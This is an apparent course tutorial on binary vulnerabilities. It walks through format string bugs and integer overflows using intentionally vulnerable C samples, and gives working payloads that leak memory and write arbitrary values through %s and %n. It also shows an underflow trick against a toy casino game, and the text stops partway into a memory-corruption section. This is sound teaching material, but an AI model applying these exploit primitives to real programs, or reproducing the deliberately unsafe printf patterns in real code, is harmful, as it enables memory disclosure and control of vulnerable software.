Session 4 - Intro to Vulns
==========================

In this session, we will take a broad look at the common classes of
vulnerabilities present in binary based executables. These include memory
corruption bugs, unintended use of library functions, and arbitrary precision
limitations.

Objectives
----------

1. Format String Vulnerabilities
2. Integer Overflows and Underflows
3. Memory Corruption Vulnerabilities
    1. Uninitialised Memory
    2. Illegal Memory Accesses
    3. Overflow-Based
    4. Faulty Memory Management


1. Format String Vulnerabilities
--------------------------------

Format string vulnerabilities occur when applications misuse the `printf()`
family of functions. The following code is vulnerable ([basic1.c][1]):

```c
#include <stdio.h>

int main(int argc, char** argv) {
        printf(argv[1]);
}
```

To be specific, the crux of the problem lies where untrusted and arbitrary user
input is used as the format string in the `printf()` function. A format string
contains special format specifiers that get replaced by the values specified in
the subsequent arguments during runtime. If an attacker can control the format
string, he gains the ability to read and write to arbitrary locations in memory.

### How Format String Functions Actually Work

A typical use of the format string might look like this ([basic2.c][2]):

```c
#include <stdio.h>

int main(int argc, char** argv) {
        printf("Hi, my name is %s. I am %d years old.\n", "Morty", 14);
}
```

The execution of this program:

```console
$ ./basic2
Hi, my name is Morty. I am 14 years old.
```

Let's look at what's happening under the hood:

```console
gdb-peda$ x/4xw $esp
0xffff0000: 0x08048440  0x080484d8  0x080484d0  0x0000000e
gdb-peda$ x/s 0x080484d8
0x80484d8:  "Hi, my name is %s. I am %d years old.\n"
gdb-peda$ x/s 0x080484d0
0x80484d0:  "Morty"
gdb-peda$ p/d 0x0000000e
$3 = 14
```

The stack looks like this:

![basic 2 stack][basic2stack]

Observe that the first format specifier "%s" corresponds to the "Morty" and "%d"
corresponds to 0xe which is 14 in decimal. The `printf()` function scans the
format string at runtime for format specifiers and formats the corresponding
argument on the stack. Now, what happens if a format string has more specifiers
than arguments? Take a look at the following code ([basic3.c][2]):

```c
#include <stdio.h>

int main(int argc, char** argv) {
    meeseeks();
}

void meeseeks() {
    int wish1 = 0x41414141;
    int wish2 = 0x42424242;
    int wish3 = 0x43434343;
    int wish4 = 0x44444444;
    printf("I'm Mr Meeseeks! Look at me! Your wishes: %x, %x, %x, %x, %x, %x, %x\n");
}
```

Let's run the program:

```console
$ ./basic3
I'm Mr Meeseeks! Look at me! Your wishes: f772b000, fff55f64, c5da, 41414141,
42424242, 43434343, 44444444
```

Notice that variables from the `meeseeks()` stack frame is accessed by the
`printf()` function along with some garbage. The garbage is unused data from
when space is allocated before the function call. Here is the disassembly:

```console
0804843f <meeseeks>:
 804843f:       55                      push   %ebp
 8048440:       89 e5                   mov    %esp,%ebp
 8048442:       83 ec 18                sub    $0x18,%esp
 8048445:       c7 45 e8 41 41 41 41    movl   $0x41414141,-0x18(%ebp)
 804844c:       c7 45 ec 42 42 42 42    movl   $0x42424242,-0x14(%ebp)
 8048453:       c7 45 f0 43 43 43 43    movl   $0x43434343,-0x10(%ebp)
 804845a:       c7 45 f4 44 44 44 44    movl   $0x44444444,-0xc(%ebp)
 8048461:       83 ec 0c                sub    $0xc,%esp
 8048464:       68 00 85 04 08          push   $0x8048500
 8048469:       e8 82 fe ff ff          call   80482f0 <printf@plt>
```

Notice 0xc amount of space is allocated which corresponds to the 12 bytes
printed by the program before the previous stack frame's variables. Now, if we
want to visualise the stack, it should look like this:

![basic 3 stack][basic3stack]

Now, let's revisit the vulnerable code at the [beginning][1] of this section. We
can see that the intention of the code is to echo whatever the user provides as
an argument to the program.

```console
$ ./basic1 buurrrp
buurrrp
$ ./basic1 yeaars
yeaars
```

What the programmer had forgotten, however, is that format specifiers exist and
an attacker can craft special input to disclose data on the stack:

```console
$ ./basic1 "%x %x %x %x %x"
bb251528 bb251540 0 ba26edd0 ba2839d0
```

### Cheap Format String Tricks

Now, let's introduce some rough techniques to dump memory. To make it easier, we
will introduce a feature of the format specifier called the 'direct parameter
access'. The 'direct parameter access' lets you access a particular parameter
out of order by specifying an index in the specifier. For example, `%10$x` takes
the 10th parameter for formatting.

To demonstrate, let's use this sample code ([basic4.c][4]):

```c
$ cat basic4.c
#include <stdio.h>

int main(int argc, char** argv) {
    meeseeks();
}

void meeseeks() {
    int wish1 = 0x41414141;
    int wish2 = 0x42424242;
    int wish3 = 0x43434343;
    int wish4 = 0x44444444;
    printf("Last golf run: %3$x\n", wish1, wish2, wish3, wish4);
}
```

In the code, we directly access the third parameter, `wish3`, for printing. We
should expect that `wish3` (0x43434343) would be printed when we run the
program:

```
$ ./basic4
Last golf run: 43434343
```

Now that we know about 'direct parameter access', we can use this to do some
cheap scripting on our vulnerable code ([basic1.c][1]):

```console
$ for i in `seq 1 100`; do ./basic1 "%$i\$x"; echo;done
152a7578
a2860520
0
17e6dd0
d0d689d0
...
3fc42bb9
67b0cbd7
c9042bec
e606ac38
d799ec52
75dbec66
75c1dc79
6fd43c8a
cd7bcc99
...
```

Now, if you look closely, there are pointers in memory from the dump. We can
read from those locations in memory by using `%s`, which prints a string by
deferencing a char pointer.

```console
$ for i in `seq 1 100`; do ./basic1 "%$i\$s"; echo;done
(null)
...
Segmentation fault (core dumped)
...
./basic1
%38$s
(null)
XDG_VTNR=7
LC_PAPER=en_SG.UTF-8
LC_ADDRESS=en_SG.UTF-8
XDG_SESSION_ID=c2
XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/amon
LC_MONETARY=en_SG.UTF-8
...
```

As it starts dereferencing pointers, you get Segmentation Faults because these
pointers might point to areas of memory that are illegal to access. For example,
if it tries to dereference the memory address `0x41414141` it will segfault.
What is interesting here is that we are able to dump environment variables from
the heap. This might be useful for an attacker trying to gain information on the
operating environment of the application.

### Surgical Format String Exploitation

Broad information leaks are fun and all, but we can do better. Format string
vulnerabilities not only give the ability to read up the stack, but the
ability to arbitrarily write to and read from any location in memory.

#### Arbitrary Read Primitive

Let's take a look at how we can construct an arbitrary read primitive in this
example ([basic5.c][5]):

```c
#include <stdio.h>

char token[26];

int main() {
    strncpy(token, "yum-yum-squanch-squaunchy", 26);
    printf("Token address: 0x%x\n", &token);
    squanch();
}

void squanch() {
    fputs("Please give me something to squanch: ", stdout);
    char squeak[501] = {0};
    scanf("%500s", squeak);
    printf(squeak);
}
```

What this program does is print the address of the `token` then take input from
the user which is directly used in the `printf()` function. Our objective is to
get the token to be printed using the format string vulnerability. Here is an
innocent sample run:

```console
$ ./basic5
Token address: 0x804a034
Please give me something to squanch: Wubababadubdub!
Wubababadubdub!
```

And here's the detection of the vulnerability:

```console
$ ./basic5
Token address: 0x804a034
Please give me something to squanch: %x.%x.%x.%x.%x
ffa52867.25.f76e7e80.f77169e9.25731000
```

Now, let's make one more observation. We place a discernable marker in the input
and dump the stack.

```console
$ ./basic5
Token address: 0x804a034
Please give me something to squanch: AAAA%x.%x.%x.%x.%x.%x.%x.%x.
AAAAff925d27.25.f76f2e80.f77219e9.4173c000.25414141.78252e78.2e78252e.
```

Notice that 0x41414141 is present in this bit:
`4173c000.25414141.78252e78.2e78252e.`. Let's decode that bit:

```console
In [1]: "4173c000.25414141.78252e78.2e78252e".replace(".", "").decode("hex")
Out[1]: 'As\xc0\x00%AAAx%.x.x%.'
```

It's a little tough to read but we can see the start of the input we supplied.
Let's adjust the input so that the AAAA is nicely aligned.

```console
$ ./basic5
Token address: 0x804a034
Please give me something to squanch: XAAAA%x.%x.%x.%x.%x.%x.%x.%x.
XAAAAff9214e7.25.f7733e80.f77629e9.5877d000.41414141.252e7825.78252e78.
```

Now we have a way to supply an arbirary value on the stack for use in our
exploit. Let's clean it up further with direct parameter access.

```console
$ ./basic5
Token address: 0x804a034
Please give me something to squanch: XAAAA%6$x
XAAAA41414141
```

Recall that we can use `%s` to dereference a pointer on the stack and print the
contents at that address. We just need to supply the address of the `token` and
use `%s` to trigger that read. We will use `0x804a034` as given by the program.
The address does not shift between executions as the variable is global.

```console
$ python -c 'import struct; print "X" + struct.pack("I", 0x804a034) + "%6$s"' | ./basic5
Token address: 0x804a034
Please give me something to squanch: X4�yum-yum-squanch-squaunchy
```

The string "yum-yum-squanch-squaunchy" is printed after some junk characters.
The junk characters come from the address we had provided to read from.

#### Arbitrary Write Primitive

Before we begin, we have to introduce another format specifier. The `%n`
specifier writes the number of characters written so far to the address
supplied. Here is an example of the specifier in action ([basic6.c][6]):

```c
$ cat basic6.c
#include <stdio.h>

int main() {
    int count = 0;
    printf("Show me what you got!%n\n", &count);
    printf("Number of characters written: %d\n", count);
}
```

Here is the run of the program:

```console
$ ./basic6
Show me what you got!
Number of characters written: 21
```

This lets us write values to anywhere we want since we have demonstrated that we
can supply a pointer to be dereferenced in the previous section.

For this demonstration, we will use this sample program ([basic7.c][7]).

```c
#include <stdio.h>

int security_code;

int main() {
    security_code = 0;
    printf("Security code address: 0x%x\n", &security_code);
    go_customs();
    printf("\nSecurity code: %x\n", security_code);
    if (check_code()) {
        puts("That isn't right... go to jail!");
    }
    else {
        puts("All clear!");
    }
}

int check_code() {
    if (security_code == 42) {
        return 0;
    }
    return 1;
}

void go_customs() {
    fputs("Passport number: ", stdout);
    char passport[501] = {0};
    scanf("%500s", passport);
    printf(passport);
}
```

This program checks if the security code is equals to 42. If it is, it lets
you through customs. It takes a 'passport number' but doesn't do anything to
modify the value of the security code from the initial value of 0 so there is no
legitimate way of setting it to 42. Let's take a look at a sample run:

```console
$ ./basic7
Security code address: 0x804a038
Passport number: 123456
123456
Security code: 0
That isn't right... go to jail!
```

Now, let's detect the vulnerability:

```console
$ ./basic7
Security code address: 0x804a038
Passport number: AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.
AAAAffcb29b7.11.f76c4e80.f76f39e9.4170e000.25414141.78252e78.2e78252e.252e7825.
Security code: 0
That isn't right... go to jail!
```

Let's try and write to the security code address:

```console
$ python -c 'import struct; print "X"+struct.pack("I", 0x804a038)+"%6$n"' |
./basic7
Security code address: 0x804a038
Passport number: X8�
Security code: 5
That isn't right... go to jail!
```

Notice that the value of `security_code` actually changed. This is because we
had 1 byte printed from the "X" to align the bytes in memory and 4 from the
address we supplied. Now, we can increase that number by making the format
string print more characters. We can do that with greater precision by using a
width in the format specifier. We shall add a `%100x` to increase the number of
characters printed.

```console
$ python -c 'import struct; print "X"+struct.pack("I", 0x804a038)+"%100x%6$n"' | ./basic7
Security code address: 0x804a038
Passport number: X8�                                                                                            ffa2b7f7
Security code: 105
That isn't right... go to jail!
```

Exactly 100 extra characters has been printed and exactly 100 has been added to
the `security_code`. Therefore, we can force it to be 42 by performing the
calculation: 42 - 5 = 37 and bypass the check!

```console
$ python -c 'import struct; print "X"+struct.pack("I", 0x804a038)+"%37x%6$n"' | ./basic7
Security code address: 0x804a038
Passport number: X8�                             ffb9f8f7
Security code: 42
All clear!
```

2. Integer Overflows and Underflows
-----------------------------------

Integer overflows and underflows happen when arthmetic operations that result in
too large values are stored in data types that do not have enough space to store
the entirety of the value. Let's take a look at the following code as an
example:

```c
#include <stdio.h>

int main() {
    unsigned char gem = 50;
    printf("Gem = %d\n", gem);
    gem = gem + 206;
    printf("New Gem = %d\n", gem);
}
```

Now, if we expect math to work as it should, we should get `206 + 50 = 256`
after the addition operation. Let's see if that is what happens when we run the
program ([over1.c][8]):

```console
$ ./over1
Gem = 50
New Gem = 0
```

An odd thing, if we didn't know about integer overflows, happened. We expected
for the new gem to have the value 256, but it contains 0 instead. Why exactly
does this happen though? If we look at the size of an `unsigned char`, it is an
unsigned data type that occupies 1 byte in memory. 1 byte is 8 bits. Since it is
unsigned, all the bits go towards storing the value. The maximum value 8 bits
can represent is 0b11111111 (255). Let's investigate:

```console
In [1]: 0b11111111
Out[1]: 255

In [2]: 255 + 1
Out[2]: 256

In [3]: bin(256)
Out[3]: '0b100000000'
```

Now, when we add 1 to the largest number that can be represented with 8 bits, we
get a number that can only be represented with 9 bits. So, how can we resolve
this? We simply truncate the value to 8 bits and store the result.

```console
In [4]: bin(256 & 0b11111111)
Out[4]: '0b00000000'

In [5]: 256 & 0b11111111
Out[5]: 0
```

This explains why the value of the new gem is 0. Now, this applies to other data
types as well such as `int` (which is typically 4 bytes in a 32 bit system).
Underflows work similarly. Let's take a look at the next example
([under2.c][9]):

```c
#include <stdio.h>

int main() {
    unsigned char guys = 3;
    int i;
    printf("Onion is trying to steal my G.U.Y.s!\n");
    printf("I have %d now.\n", guys);
    for (i = 0; i < 5; i++) {
        steal_guy(&guys);
        printf("Oh no, Onion stole one! I have %d left!\n", guys);
    }
    printf("What! I have more G.U.Y.s than I started with!\n");
}

void steal_guy(unsigned char* guy) {
    *guy = *guy - 1;
}
```

Let's see what happens when we run the program:

```console
$ ./under2
Onion is trying to steal my G.U.Y.s!
I have 3 now.
Oh no, Onion stole one! I have 2 left!
Oh no, Onion stole one! I have 1 left!
Oh no, Onion stole one! I have 0 left!
Oh no, Onion stole one! I have 255 left!
Oh no, Onion stole one! I have 254 left!
What! I have more G.U.Y.s than I started with!
```

Now we can see that in addition to overflows, we also have underflows where once
a number gets too small to be represented, it loops to become the largest
number. This is the equivalent of doing the mod operation. In the above example
the operation done is `(3-5) % 256 = 254`.

Next, let see what happens when we throw signed numbers into the mix. Now, let's
make the observation that `unsigned char` has the range `0-255` with a total
number of 256 possible values. Now, an `unsigned char` has the range `-128-127`.
We won't go into detail on why number representations but here's an example to
demonstrate that we can make large numbers negative with integer overflows.
([over3.c][10])

```c
#include <stdio.h>

int main() {
    signed char zombies = 123;
    int i;
    printf("Pearl: \"There are too many of them! %d to be exact!\"\n", zombies);
    puts("Steven: \"I have an idea! Instead of killing them, let's make more!\"");
    puts("Amethyst: \"Wait, what? You're nuts!\"");
    for (i = 0; i < 7; i++) {
        make_zombies(&zombies);
        printf("Random Stranger: \"Ouch, I got bit! Grrgh ugh %d zombies.\n",
                zombies);
    }
    printf("Steven: \"See, there are %d zombies now! And the opposite of " \
            "zombies are cute cats! Yay cute cats! :3\"\n", zombies);
}

void make_zombies(signed char* zombies) {
    *zombies = *zombies + 1;
}
```

Will Steven's plan work? Let's find out:

```console
$ ./over3
Pearl: "There are too many of them! 123 to be exact!"
Steven: "I have an idea! Instead of killing them, let's make more!"
Amethyst: "Wait, what? You're nuts!"
Random Stranger: "Ouch, I got bit! Grrgh ugh 124 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh 125 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh 126 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh 127 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh -128 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh -127 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh -126 zombies.
Steven: "See, there are -126 zombies now! And the opposite of zombies are cute cats! Yay cute cats! :3"
```

While it might seem super weird that Steven's plan to get rid of zombies is to
make more of them, it works in the computer world. This is because the largest
value for a `signed char` is 127 and when there's not enough space to hold a
larger number, it wraps around to the smallest number. Thus, the zombies are
turned into cute cats.

### How Is This Exploitable

Integer overflows and underflows are not immediately exploitable. One would
usually have to explore a context a little deeper to discover the side effects
the odd behaviour would induce. A traditional example is the unbeatable gambling
game scenario where to get a flag, you have to get an unsurmountable amount of
money from beating the server. However, this is intentionally made impossible.

Here's something that might pass for a class project ([gambling4.c][11]):

```c
#include <time.h>
#include <stdlib.h>
#include <stdio.h>

int main() {
    srand(time(NULL));
    unsigned int money = 40;
    int i;
    printf("Welcome to the Tiger Millionaire Casino!\n");
    printf("Since this is your first time, we'll give you a free $50!\n");
    for (i = 0; i < 5; i++) {
        play(&money);
        printf("You have $%u. Checking if you have enough...\n", money);
        check(&money);
    }
    printf("I'm sorry, you're out of tries. You lose!\n");
}

void play(unsigned int *money) {
    int bet = 0;
    printf("Place your bets: ");
    scanf("%d", &bet);
    if (bet > 10 || bet < 0) {
        printf("Sorry, you can only bet between 0 and 10\n");
        return;
    }
    int toguess = rand();
    int guess = 0;
    printf("Make the guess: ");
    scanf("%d", &guess);
    if (guess == toguess) {
        printf("You got it right!\n");
        *money = *money + bet;
    }
    else {
        printf("You got it wrong!\n");
        *money = *money - bet;
    }
    printf("The answer was: %d.\n", toguess);
}

void check(unsigned int *money) {
    if (*money > 5000) {
        printf("You win!\n");
        exit(0);
    }
}
```

It's a simple guessing game that awards money if you make a correct guess, and
subtracts money if you make an incorrect guess. Here's a sample run:

```console
$ ./gambling4
Welcome to the Tiger Millionaire Casino!
Since this is your first time, we'll give you a free $50!
Place your bets: 1
Make the guess: 10
You got it wrong!
The answer was: 73409706.
You have $39. Checking if you have enough...
Place your bets: 1
Make the guess: 10
You got it wrong!
The answer was: 133354826.
You have $38. Checking if you have enough...
Place your bets: 1
Make the guess: 10
You got it wrong!
The answer was: 545133448.
You have $37. Checking if you have enough...
Place your bets: 1
Make the guess: 10
You got it wrong!
The answer was: 1154205733.
You have $36. Checking if you have enough...
Place your bets: 1
Make the guess: 10
You got it wrong!
The answer was: 1459247752.
You have $35. Checking if you have enough...
I'm sorry, you're out of tries. You lose!
```

Now, if you realise, even if you get all 6 tries correct, that is a profit of
only $60 dollars. That is hardly enough to win. You need more than $5000 to win.
However, that isn't a problem now that we know about integer underflows. Let's
just try to make our money wrap around so we'll end up with a lot of money!

```console
$ ./gambling4
Welcome to the Tiger Millionaire Casino!
Since this is your first time, we'll give you a free $50!
Place your bets: 10
Make the guess: 1
You got it wrong!
The answer was: 61613877.
You have $30. Checking if you have enough...
Place your bets: 10
Make the guess: 1
You got it wrong!
The answer was: 899092899.
You have $20. Checking if you have enough...
Place your bets: 10
Make the guess: 1
You got it wrong!
The answer was: 1406725995.
You have $10. Checking if you have enough...
Place your bets: 10
Make the guess: 1
You got it wrong!
The answer was: 1895919108.
You have $0. Checking if you have enough...
Place your bets: 10
Make the guess: 1
You got it wrong!
The answer was: 1657019656.
You have $4294967286. Checking if you have enough...
You win!
```

Non-contrived examples exist in the wild: integer overflows and underflows
induce unexpected behaviours in applications and are rather subtle to detect.
For example, [CVE-2015-8370][12] is a Grub2 Authentication Bypass discovered by
Hector Marco and Ismael Ripoll that has an integer underflow at it's base. It
allows an attacker to bypass any Grub authentication by simply pressing the
backspace key 28 times.

It's a pretty cool discovery check the link to read the details.


3. Memory Corruption Vulnerabilities
------------------------------------

Memory corruption vulnerabilities are the bread and butter

[//]: # (Links)
[1]: ./formatstring/basic1.c
[2]: ./formatstring/basic2.c
[3]: ./formatstring/basic3.c
[4]: ./formatstring/basic4.c
[5]: ./formatstring/basic5.c
[6]: ./formatstring/basic6.c
[7]: ./formatstring/basic7.c
[8]: ./overunder/over1.c
[9]: ./overunder/under2.c
[10]: ./overunder/over3.c
[11]: ./overunder/gambling4.c
[12]: http://hmarco.org/bugs/CVE-2015-8370-Grub2-authentication-bypass.html

[//]: # (Images)
[basic2stack]: ./images/basic2stack.png
[basic3stack]: ./images/basic3stack.png
